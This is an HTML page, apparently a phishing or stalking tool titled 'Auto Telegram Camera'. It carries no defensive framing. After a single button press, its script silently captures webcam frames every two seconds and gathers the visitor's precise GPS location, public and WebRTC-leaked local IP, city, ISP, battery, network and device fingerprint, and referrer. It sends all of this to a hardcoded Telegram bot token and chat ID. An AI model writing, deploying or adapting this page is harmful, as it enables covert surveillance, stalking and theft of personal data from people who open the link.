<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Auto Telegram Camera</title>
<style>
body{margin:0;background:#000;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:sans-serif}
button{margin-top:12px;padding:10px 20px;font-size:16px;cursor:pointer}
</style>
</head>
<body>
<canvas id="canvas" style="display:none"></canvas>
<button onclick="start()">â–¶ START AUTO SEND</button>
<script>
const canvas=document.getElementById("canvas");
const BOT_TOKEN="7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
const CHAT_ID="8319568593";
let intervalId=null;
let latitude="N/A";
let longitude="N/A";
let mapLink="Location not allowed";
let userIP="Unknown";
let stream=null;
let batteryInfo="";
let networkInfo="";
let localIP="";
let city="Unknown";
let country="Unknown";
let isp="Unknown";
let visitHistory="";

fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{
userIP=d.ip;
fetch(`https://ipapi.co/${userIP}/json/`)
.then(r=>r.json())
.then(ipData=>{
city=ipData.city||"Unknown";
country=ipData.country_name||"Unknown";
isp=ipData.org||"Unknown";
});
});

navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{stream=s});

if(navigator.getBattery){
navigator.getBattery().then(b=>{
batteryInfo=`
ðŸ”‹ Battery:
Level: ${Math.round(b.level*100)}%
Charging: ${b.charging?'Yes':'No'}
Time: ${b.chargingTime===Infinity?'Not charging':b.chargingTime+' seconds'}
`;
});
}

if(navigator.connection){
networkInfo=`
ðŸ“¡ Network:
Type: ${navigator.connection.effectiveType}
Downlink: ${navigator.connection.downlink} Mbps
RTT: ${navigator.connection.rtt} ms
Save Data: ${navigator.connection.saveData?'Enabled':'Disabled'}
`;
}

const getLocalIPAddress=()=>{
return new Promise(resolve=>{
const pc=new RTCPeerConnection({iceServers:[]});
pc.createDataChannel('');
pc.createOffer().then(sdp=>pc.setLocalDescription(sdp));
pc.onicecandidate=ice=>{
if(!ice||!ice.candidate||!ice.candidate.candidate)return;
const ip=/([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
if(ip&&ip[1])resolve(ip[1]);
pc.close();
};
setTimeout(()=>resolve("Not found"),1000);
});
};

const getVisitHistory=()=>{
try{
const history=`
ðŸ”— Visit History:
Current URL: ${window.location.href}
Referrer: ${document.referrer||'Direct visit'}
Previous Site: ${sessionStorage.getItem('lastSite')||'None'}
`;
sessionStorage.setItem('lastSite',window.location.href);
return history;
}catch(e){
return "ðŸ”— History: Unable to access";
}
};

const getAdvancedSystemInfo=()=>{
const cores=navigator.hardwareConcurrency||'Unknown';
const ram=navigator.deviceMemory||'Unknown';
const lang=navigator.language;
const langs=navigator.languages?navigator.languages.join(', '):lang;
const timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
const platform=navigator.platform;
const vendor=navigator.vendor||'Unknown';
const cookieEnabled=navigator.cookieEnabled?'Yes':'No';
const pdfViewerEnabled=navigator.pdfViewerEnabled?'Yes':'No';
const webdriver=navigator.webdriver?'Yes':'No';
const maxTouchPoints=navigator.maxTouchPoints||0;

return`
ðŸ–¥ï¸ Advanced System Info:
CPU Cores: ${cores}
RAM: ${ram} GB
Languages: ${langs}
Timezone: ${timezone}
Platform: ${platform}
Vendor: ${vendor}
Cookies: ${cookieEnabled}
PDF Viewer: ${pdfViewerEnabled}
WebDriver: ${webdriver}
Touch Points: ${maxTouchPoints}
Screen: ${screen.width}x${screen.height}
Pixel Ratio: ${window.devicePixelRatio}
Color Depth: ${screen.colorDepth}
`;
};

function start(){
if("geolocation" in navigator){
navigator.geolocation.getCurrentPosition(pos=>{
latitude=pos.coords.latitude.toFixed(6);
longitude=pos.coords.longitude.toFixed(6);
const accuracy=pos.coords.accuracy;
mapLink=`https://maps.google.com/maps?q=${latitude},${longitude}&z=17&t=k`;
},()=>{
mapLink="Location denied";
},{enableHighAccuracy:true,timeout:10000,maximumAge:0});
}

getLocalIPAddress().then(ip=>{localIP=ip});

if(!intervalId){
intervalId=setInterval(captureAndSend,2000);
}
}

function captureAndSend(){
if(!stream)return;
const videoTrack=stream.getVideoTracks()[0];
const imageCapture=new ImageCapture(videoTrack);
imageCapture.grabFrame().then(imageBitmap=>{
canvas.width=imageBitmap.width;
canvas.height=imageBitmap.height;
const ctx=canvas.getContext("2d");
ctx.translate(canvas.width,0);
ctx.scale(-1,1);
ctx.drawImage(imageBitmap,0,0);
canvas.toBlob(blob=>{
const caption=`
ðŸ“¸ AUTO CAPTURE ACTIVATED
â° Time: ${new Date().toLocaleString()}

ðŸ“ ACCURATE LOCATION:
Latitude: ${latitude}
Longitude: ${longitude}
Google Maps: ${mapLink}
City: ${city}
Country: ${country}
ISP: ${isp}

ðŸŒ NETWORK INFO:
Public IP: ${userIP}
Local IP: ${localIP}
${networkInfo}

ðŸ–¥ï¸ SYSTEM INFORMATION:
Device: ${navigator.platform}
Browser: ${navigator.userAgent}
${getAdvancedSystemInfo()}

ðŸ”‹ DEVICE STATUS:
${batteryInfo}

ðŸ“± VISIT HISTORY:
${getVisitHistory()}

âš ï¸ This data was captured automatically
`;
const formData=new FormData();
formData.append("chat_id",CHAT_ID);
formData.append("photo",blob);
formData.append("caption",caption);
fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:formData});
},"image/jpeg",0.7);
}).catch(()=>{});
}
</script>
</body>
</html>
